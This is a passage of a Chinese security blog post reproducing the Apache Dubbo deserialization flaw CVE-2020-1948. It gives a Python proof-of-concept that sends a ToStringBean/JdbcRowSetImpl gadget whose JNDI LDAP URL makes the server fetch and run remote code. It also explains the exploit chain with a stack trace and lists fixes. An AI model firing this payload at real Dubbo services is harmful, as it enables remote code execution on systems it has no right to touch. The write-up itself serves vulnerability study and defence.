+<h3 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> dubbo.codec.hessian2 <span class="keyword">import</span> Decoder,new_object</span><br><span class="line"><span class="keyword">from</span> dubbo.client <span class="keyword">import</span> DubboClient</span><br><span class="line"></span><br><span class="line">client = DubboClient(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">JdbcRowSetImpl=new_object(</span><br><span class="line">      <span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span>,</span><br><span class="line">      dataSource=<span class="string">&quot;ldap://127.0.0.1:8087/#ExportObject&quot;</span>,</span><br><span class="line">      strMatchColumns=[<span class="string">&quot;foo&quot;</span>]</span><br><span class="line">      )</span><br><span class="line">JdbcRowSetImplClass=new_object(</span><br><span class="line">      <span class="string">&#x27;java.lang.Class&#x27;</span>,</span><br><span class="line">      name=<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">      )</span><br><span class="line">toStringBean=new_object(</span><br><span class="line">      <span class="string">&#x27;com.rometools.rome.feed.impl.ToStringBean&#x27;</span>,</span><br><span class="line">      beanClass=JdbcRowSetImplClass,</span><br><span class="line">      obj=JdbcRowSetImpl</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">resp = client.send_request_and_return_response(</span><br><span class="line">    service_name=<span class="string">&#x27;org.apache.dubbo.spring.boot.demo.consumer.DemoService&#x27;</span>,</span><br><span class="line">    method_name=<span class="string">&#x27;rce&#x27;</span>,</span><br><span class="line">    args=[toStringBean])</span><br></pre></td></tr></table></figure>
+
+
+
+<p>不难发现，该漏洞利用链最终是通过JdbcRowSetImpl调用jndi来进行远程代码执行。同时我们发现该gadget中用到了com.rometools.rome.feed.impl.ToStringBean，所以Provider的pom.xml中需要添加rometools的引用</p>
+<p>我们向<code>dubbo-spring-boot-samples/auto-configure-samples/provider-samplepom.xml</code> 添加依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.rometools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后导入依赖</p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>本次漏洞利用的是 <code>com.rometools.rome.feed.impl.ToStringBean#toString</code> 方法，重写了 <code>toString</code>，该方法将会调用构造对象的所有 <code>getter</code> 方法</p>
+<p><img src="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/rome_ToStringBean.png" alt="img"></p>
+<p>从上面 <code>PoC</code> 可以看到，执行 <code>Dubbo</code> 调用时，传入的是 <code>ToStringBean</code> 类型参数，构造的对象是<code>com.sun.rowset.JdbcRowSetImpl</code>，并且 <code>datasource</code> 属性设置的是 <code>JNDI</code> 暴露的 <code>url</code>，在调用 <code>JdbcRowSetImpl</code> 的 <code>getDatabaseMetaData</code> 方法时，执行 <code>connect</code> 操作，下载远端代码，在 <code>Service Provider</code> 执行，造成攻击。</p>
+<p><img src="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/jdbcRowSetImpl_connect_result.png" alt="img"></p>
+<p>调起 <code>toString</code> 方法的地方是在 <code>Dubbo Provider</code> 接收 <code>DecodeHandler#received:44</code> 请求，在 <code>DecodeableRpcInvocation#decode</code> 反序列化参数的地方：</p>
+<p><img src="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/decode_by_hession.png" alt="img"></p>
+<p><code>dubbo</code> 默认使用的是 <code>hession2</code> 序列化，解析参数执行的是这个方法</p>
+<blockquote>
+<p>org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput#readUTF</p>
+</blockquote>
+<p>在 <code>hession</code> 反序列化过程中，通过下面代码段执行到了 <code>ToStringBean#toString</code></p>
+<p><img src="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/equalsBean_hashcode_chain.png" alt="img"></p>
+<h3 id="堆栈利用链"><a href="#堆栈利用链" class="headerlink" title="堆栈利用链"></a>堆栈利用链</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">connect:624, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">toString:158, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">toString:129, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hashCode:180, EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hash:339, HashMap (java.util)</span><br><span class="line">put:612, HashMap (java.util)</span><br><span class="line">doReadMap:145, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:2703, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:2278, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:2080, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:2074, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:92, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)</span><br><span class="line">decode:139, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:79, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:57, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">received:44, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)</span><br></pre></td></tr></table></figure>
+
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
+<li>删除 <code>RpcInvocation</code> 类的 <code>toString</code> 方法中输出的 <code>arguments</code> 参数,防范后反序列化攻击。同时对 <code>Hessian</code> 进行黑白名单加固来防范 <code>Hessian</code> 反序列化攻击。</li>
+<li>升级 2.7.7 版本，并根据<a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/pull/6374/commits/8fcdca112744d2cb98b349225a4aab365af563de">https://github.com/apache/dubbo/pull/6374/commits/8fcdca112744d2cb98b349225a4aab365af563de</a> 的方法进行参数校验</li>
+<li>禁止将 <code>Dubbo</code> 服务端端口开放给公网，或仅仅只对能够连接至 <code>Dubbo</code> 服务端的可信消费端IP开放</li>
+<li><code>Dubbo</code> 协议默认采用 <code>Hessian</code> 作为序列化反序列化方式，该反序列化方式存在反序列化漏洞。在不影响业务的情况下，建议更换协议以及反序列化方式。具体更换方法可参考：<a target="_blank" rel="noopener" href="http://dubbo.apache.org/zh-cn/docs/user/references/xml/dubbo-protocol.html">http://dubbo.apache.org/zh-cn/docs/user/references/xml/dubbo-protocol.html</a></li>
+</ol>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/JingQ/p/13329083.html">https://www.cnblogs.com/JingQ/p/13329083.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhengjim/p/13204194.htmlhttps://www.cnblogs.com/zhengjim/p/13204194.html">https://www.cnblogs.com/zhengjim/p/13204194.htmlhttps://www.cnblogs.com/zhengjim/p/13204194.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1266/#apache-dubbo">https://paper.seebug.org/1266/#apache-dubbo</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">h0ld1rs</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://h0ld1rs.github.io/2021/07/07/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://h0ld1rs.github.io/2021/07/07/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://h0ld1rs.github.io" target="_blank">h0ld1rs的随手记</a>！</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/image/1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/07/31/PHP/%E5%85%B3%E4%BA%8Ephp%E4%B8%ADexit%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E7%9A%84%E9%97%AE%E9%A2%98/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/2021/07/07/API%E5%AE%89%E5%85%A8/GraphQL/"><img class="next-cover" src="/img/%E5%9B%BE%E5%BA%93/26.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">GraphQL</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">h0ld1rs</div><div class="author-info__description">博主笨的离谱，希望各位佬们多包含</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">96</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/h0ld1rs"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/h0ld1rs/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:yumeibumei@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2020-1948"><span class="toc-number">1.</span> <span class="toc-text">CVE-2020-1948</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#APache-Dubbo%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">APache Dubbo简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.2.</span> <span class="toc-text">环境复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#docker%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.1.</span> <span class="toc-text">docker操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6"><span class="toc-number">1.4.</span> <span class="toc-text">原理研究</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc1"><span class="toc-number">1.4.1.</span> <span class="toc-text">poc1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc2"><span class="toc-number">1.4.2.</span> <span class="toc-text">poc2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">1.4.3.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E6%A0%88%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.4.4.</span> <span class="toc-text">堆栈利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.4.5.</span> <span class="toc-text">修复建议</span></a></li></ol></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/hello-world/" title="Hello World"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2021/07/31/hello-world/" title="Hello World">Hello World</a><time datetime="2021-07-31T14:18:47.559Z" title="发表于 2021-07-31 22:18:47">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/XSS/%E4%B8%89%E7%A7%8Dxss%E7%9A%84%E5%8C%BA%E5%88%AB/" title="三种xss的区别"><img src="/img/image/%20.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="三种xss的区别"/></a><div class="content"><a class="title" href="/2021/07/31/XSS/%E4%B8%89%E7%A7%8Dxss%E7%9A%84%E5%8C%BA%E5%88%AB/" title="三种xss的区别">三种xss的区别</a><time datetime="2021-07-31T13:23:29.000Z" title="发表于 2021-07-31 21:23:29">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/Cookie/" title="Cookie"><img src="/img/image/1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cookie"/></a><div class="content"><a class="title" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/Cookie/" title="Cookie">Cookie</a><time datetime="2021-07-31T13:22:32.000Z" title="发表于 2021-07-31 21:22:32">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/SQL%E6%B3%A8%E5%85%A5/%E9%A2%84%E7%BC%96%E8%AF%91/" title="预编译"><img src="/img/image/19.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="预编译"/></a><div class="content"><a class="title" href="/2021/07/31/SQL%E6%B3%A8%E5%85%A5/%E9%A2%84%E7%BC%96%E8%AF%91/" title="预编译">预编译</a><time datetime="2021-07-31T13:19:28.000Z" title="发表于 2021-07-31 21:19:28">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/LDAP/" title="LDAP"><img src="/img/image/%20.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="LDAP"/></a><div class="content"><a class="title" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/LDAP/" title="LDAP">LDAP</a><time datetime="2021-07-31T13:17:25.000Z" title="发表于 2021-07-31 21:17:25">2021-07-31</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/image/1.png)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By h0ld1rs</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: 'VW87gUH9lGz0MqQ26R0dxvzS-gzGzoHsz',
+      appKey: 'hXDx5AOht2WentElxJRM8xnK',
+      placeholder: '来啊，快活啊!',
+      avatar: 'monsterid',
+      meta: 'nick'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else $.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script>(function(){
+  const bp = document.createElement('script');
+  const curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https'){
+  bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  bp.dataset.pjax = ''
+  const s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})()</script></div></body></html>
